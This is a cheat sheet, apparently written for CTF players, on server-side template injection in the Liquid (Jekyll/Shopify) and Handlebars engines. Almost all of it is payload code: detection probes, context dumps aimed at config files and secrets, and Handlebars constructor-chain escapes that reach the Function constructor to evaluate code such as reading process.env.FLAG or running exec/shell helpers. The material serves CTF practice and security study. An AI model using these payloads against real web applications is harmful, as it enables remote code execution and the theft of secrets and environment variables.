# Liquid + Handlebars depth — the "safe" engines

Both were built to be template-safe: Liquid is the Rails/Shopify/
Jekyll engine (logic-less-ish), Handlebars is Mustache++. They're
harder to escape — which is why CTF uses them: the escape is the
puzzle.

---

## Liquid — the Shopify/Jekyll engine

### Syntax surface
```liquid
{{x}}                      -- expression output
{{x.y}}                    -- attr/item walk
{% if %} {% for %} {% assign %} {% capture %}
{% include %} {% render %}
{% raw %} {% comment %}
{{x|filter:arg}}
{{x|filter: arg1, arg2}}
```

### Detection
```liquid
{{7*7}}          → "7*7" literal! — Liquid has NO arithmetic in
                    expressions — needs a filter or assign-math
{% assign x=7|times:7 %}{{x}}    → 49 — the |times filter
{{7|plus:7}}     → 14 — arithmetic is FILTER-form
{{'a'|upcase}}   → 'A'
{%assign x='ab'%}{{x}} → 'ab'
{{x.y}}          → dotted-walk — arrays/hashes/objects
{{x[0]}}         → index
{{'x'}}          → 'x'
{{undefined}}    → empty — silent
```

`{{7*7}}` rendering `7*7` LITERALLY is THE Liquid signature —
people think "not SSTI" and miss it — Liquid just can't do `*`.
`{{7|times:7}}` → 49 is the real probe.

### Liquid escapes — the narrow reach

```liquid
{{x.__class__}}                        — ruby attr? liquid's
                                          drop-model gates attrs
{{x.class}}                             — maybe
{{x}}                                   — object to_s
{{x.methods}}                           — likely gated
{{app}} {{site}} {{page}}               — jekyll/shopify context
{{site.posts}} {{site.pages}} {{site.config}}
{{page.content}} {{page.title}}
{{layout}} {{content}}
{{shop}} {{product}} {{customer}}       — shopify objects
{{settings}} {{routes}} {{theme}}
{{forloop}} {{tablerowloop}}
{{''['class']}}                          — bracket-walk — same gate
{{''['class']['ancestors']}}
```

Liquid runs inside a Drop model — only WHITELISTED attrs are
visible. The escape target is the CONTEXT objects (`site`, `page`,
`shop`, `settings`) — they leak whatever the app bound.

### The Jekyll/Shopify-specific shapes
```liquid
{% include x %}              — partial-include — path inside _includes
{% include '../flag' %}       — traversal? — loader-bounded
{% include_relative x %}     — relative-include — dir-adjacent
{{site.posts|where:'slug','x'}} — filters on collections — data-mining
{{site.pages}} {{site.static_files}} — file-inventory
{{site.data}}                — _data dir — yaml/json contents
{{site.config}}              — _config.yml — secrets in config!
```

`{{site.data}}`/`{{site.config}}` — Jekyll's `_data` and
`_config.yml` — flag/config leaks live there.

## Handlebars — logic-less Mustache++

### Syntax surface
```handlebars
{{x}}                    -- escaped output
{{{x}}}                  -- RAW unescaped
{{x.y}} {{x.[key]}} {{x.0}}
{{#if}} {{#each}} {{#with}} {{#unless}}
{{helper arg1 arg2}}
{{helper (subhelper arg)}}   -- subexpressions — parens!
{{helper arg=val}}
{{*x}} {{!-- comment --}} {{! comment }}
```

### Detection
```handlebars
{{7*7}}          → "7*7" literal — Handlebars has NO arithmetic
{{x}}             → value — works
{{x.y}}           → attr-walk — works
{{this}}          → context — the current object
{{@root}}         → root context
{{@index}} {{@key}} {{@first}} — iteration-specials — inside each
{{lookup x 'y'}}   — the lookup helper — dynamic-key — works
{{x 'y'}}          — helper-call grammar — if x is a helper?
```

The `{{7*7}}` → `7*7` literal — same "looks-safe" trap as Liquid —
Handlebars isn't safe-by-expr because HELPERS are callable.

### The escape: `{{lookup}}` + prototype walk

```handlebars
{{lookup this 'constructor'}}              — this.constructor!
{{lookup this 'name'}}
{{lookup (lookup this 'constructor') 'name'}}
{{with (lookup this 'constructor')}}{{name}}{{/with}}
{{this.constructor}}                        — sometimes direct works
{{this.constructor.constructor}}            — → Function!
{{this.__proto__}}
{{this.__proto__.constructor}}
```

`{{lookup obj 'key'}}` — the dynamic-attr helper — the canonical
Handlebars escape — walks to `constructor` → `Function` →
`constructor('code')()` → eval. Same shape as Nunjucks.

### The full JS-escape chain
```handlebars
{{#with (lookup this 'constructor')}}
  {{#with (lookup this 'constructor')}}
    {{this 'return process.env.FLAG'}}     — Function-ctor call
  {{/with}}
{{/with}}
   — with-blocks step into each scope — the ctor-chain evals

{{this.constructor.constructor('return process')()}}
   — when method-calls in paths are allowed — version-dependent

{{#with "s" as |s|}}{{#with s.constructor as |c|}}
{{#with c.constructor as |f|}}{{f "return process.env.FLAG"}}{{/with}}
{{/with}}{{/with}}
   — as-aliases — alternate walk
```

Handlebars versions differ on whether `{{x()}}`/paren-calls work —
`{{#with}}`+`{{lookup}}` is the version-agnostic path.

### The `{{@root}}`/`{{this}}` context leaks
```handlebars
{{this}}          — the current context — dump it
{{@root}}          — root render context — flag-var maybe bound
{{@root.secret}}
{{@root.flag}}
{{@root.process}} — if a process ref leaked into context
{{@root.global}}
{{@root.env}}
{{this.env}} {{this.flag}} {{this.secret}}
{{this.constructor.name}} — type-name — engine tell
```

`@root` reaches the top-level render context — often richer than
the current block-scope.

### The custom-helper path — app-registered fns
```handlebars
{{myhelper 'arg'}}           — if the app registered helpers —
                               each is app-code — find exec ones
{{exec 'id'}} {{shell 'id'}} {{eval 'x'}}
{{renderFile '/flag'}}
{{#helper}}{{{this}}}{{/helper}}  — block-helpers — raw output
```

App-registered helpers are the REAL escape in production
Handlebars — `handlebars.registerHelper('x', fn)` — inventory
them by trying common names + reading bound-context.
